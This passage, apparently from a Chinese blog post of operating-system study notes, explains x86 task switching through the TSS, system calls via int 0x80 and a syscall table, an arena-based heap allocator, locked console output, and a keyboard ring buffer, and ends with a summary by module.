中的各寄存器的值载入 CPU 中对应的寄存器，从而实现了任务切换\n\n0x0f 系统调用基本知识\n所谓系统调用就是让用户进程申请操作系统的帮助，让操作系统帮其完成某项工作，也就相当于是用户进程调用了操作系统的功能\n\nLinux 系统调用是用中断门来实现的，通过软中断指令 int 来主动发起中断信号。Linux 只占用一个中断向量号，即 0x80 ，处理器执行指令 int 0x80 时便出发了系统调用，而在系统调用之前，Linux 在寄存器 eax 写入子功能号，当用户通过 int 0x80 进行系统调用时，对应的中断处理例程会根据 eax 的值来判断用户进程申请哪种系统调用\n我们来梳理一下系统调用的实现思路\n如上图：\n\n用中断门实现系统调用,效仿Linux 用0x80号中断作为系统调用的入口\n在 IDT 中安装 0x80 号中断对应的描述符，在该描述符种注册系统调用对应的中断处理例程\n建立系统调用子功能函数表 syscall_table,利用 eax 寄存器中的子功能号在该表中索引相应的处理函数\n用宏实现用户空间系统调用接口_syscall\n\n堆内存管理知识我们之前实现的内存管理形式过于粗糙，分配的内存是以4KB大小的页框为单位，所以我们需要实现一种小内存快的管理，可以满足任意内存大小的分配。\n\n  \n    \n      arena\n\n    \n    \n      arena，一种内存管理概念，将大块内存划分为多个小块，每个小块之间互不干涉，可以分别管理，就叫做arena\n我们可以认为arena是由“一大块内存”被划分成无数“小内存块”的内存仓库。arena的这一大块内存就是通过malloc_page获得以 4KB 为粒度的内存，根据请求的内存量的大小， arena的大小也许是一个页框，也可能是多个页框，随后再平均拆分成多个小内存块。\n根据内存块的大小，可以划分出不同规格的arena，例如一个arena中全是16字节大小的内存块，所以它只响应 16 字节以内的内存分配；另一种arena中全是32字节大小的内存块，故它只响应 32 字节以内的内存分配。\n我们平时调用malloc申请内存的时候，操作系统返回的地址其实就是魔偶个内存块的起始地址，操作系统会根据malloc申请的内存大小来选择不同的内存块。\n\n同时，arena是一个提供内存分配的数据结构，它分为两部分：\n\n一部分是元信息，用来描述自己内存池中空闲内存块的数量，这其中包括内存块描述符指针，可以通过它间接获知本 arena 所包含内存块的规格大小。则一部分占用的空间约为 12 字节\n另一部分是内存池区域，这里面由无数的内存块，此部分占用 arena 大量空间，我们把每个内存块命名为 mem_block,它们是内存分配粒度更细的资源，最终为用户分配的就是这其中的一个内存块\n\n\n\n但是arena逐渐变多，我们需要一个新的结构来统一描述arena，于是为每一种规格的内存块建立一个内存块描述符，即 mem_block_desc,在其中记录内存块规格大小，以及位于所有同类arena中的空闲内存块链表，内存块描述符简图如左图\n\n    \n  \n\narena以2为底，设计了 $2、4、8、16、32、64、128、256、512、1024$ 类别的小空间，适配各种类型的内存大小申请，以此完成了内存的获取\n\n而对于内存的释放：\n我们知道，内存的使用情况通过位图来管理，所以其实当回收内存时，我们只需要将位图响应的位清0就好了\n总结🧩 模块一：IO互斥机制与锁的引入（0x0d）\n🛠 背景问题\n\n多个线程输出字符时访问了同一光标寄存器，造成屏幕显示混乱、触发 #GP 错误。\nput_char() 是访问公共资源（VGA 寄存器）的临界区。\n\n✅ 技术要点\n\n引入信号量 semaphore的 P&#x2F;V 操作。\n实现了二元信号量的封装：lock_acquire / lock_release\n通过 console_put_str/char/int 封装原始打印函数，加锁输出，确保原子性。\n\n✅ 设计优点\n\n替代 cli/sti 粗暴关中断的方式，更优雅、效率高。\n提前为后续所有 IO 引入同步机制奠定基础。\n\n\n🧩 模块二：键盘输入驱动与环形缓冲区（0x0e）\n🔌 键盘输入原理\n\n键盘编码器（8048）产生扫描码，通过控制器（8042）传给主板，触发中断。\n分为通码（按下）与断码（松开），通过中断例程处理。\n\n🔁 环形缓冲区设计\n\n输入是生产者-消费者模型的典型代表。\n环形结构通过逻辑循环（mod 操作）维护头尾指针。\n支持并发读写：生产者（键盘中断）写入，消费者（Shell、read）读取。\n\n🔐 同步机制\n\n共享内存访问需加锁，避免 race condition。\n支持输入阻塞等待唤醒。\n\n\n🧩 模块三：用户进程支持 —— LDT 和 TSS 的引入（0x0e）\n🧱 LDT（Local Descriptor Table）\n\n每个任务拥有独立的段描述符集合（代码段、数据段等）\n每次进程切换需重新加载 LDT 选择子至 LDTR，实现段访问隔离。\n\n🧠 TSS（Task State Segment）\n\n存储进程的寄存器快照与栈指针。\n由 CPU 自动读写（硬件支持上下文切换）\n每个进程一个 TSS，挂载在 GDT 中，通过 ltr 加载至 TR。\n\n🧵 任务切换逻辑\n\nTR 始终指向当前任务的 TSS。\n切换任务时：\n旧任务寄存器值写入当前 TSS\n新任务 TSS 中值恢复进寄存器\n\n\n可实现 ring0 &lt;-&gt; ring3 特权级栈切换\n\n\n🧩 模块四：系统调用机制（0x0f）\n📥 基本原理\n\n用户进程不能直接访问内核，需要通过中断机制转入 ring0。\n模拟 Linux，使用 int 0x80 发起软中断。\n\n🧩 实现流程\n\n内核 IDT 中注册 0x80 中断描述符，绑定系统调用处理例程。\n用户层调用 _syscallX(...) 宏，将功能号装入 eax，参数入 ebx&#x2F;ecx&#x2F;edx 等。\n中断后内核通过 eax 查找 syscall_table[]，调用对应函数。\n\n🔑 系统调用的核心意义\n\n用户态安全调用内核服务（如 write、malloc、exit）\n建立用户态与内核态的通信桥梁\n\n\n🧩 模块五：精细堆内存管理 —— Arena机制\n📦 问题动因\n\n原先基于页框（4KB）为单位分配内存，浪费严重。\n需引入小块内存分配器来管理堆空间。\n\n🧰 Arena 内存池机制\n\nArena 是多个小内存块 mem_block 的集合。\n每种内存块规格（2^n 字节）拥有专属 Arena 管理。\nmem_block 通过双向链表组织，支持高效分配与回收。\n\n🔄 释放机制\n\n回收时只需将块归还至空闲链表。\n若 arena 所有块都空闲，释放整页。\n\n\n","categories":["OS"],"tags":["OS"]}]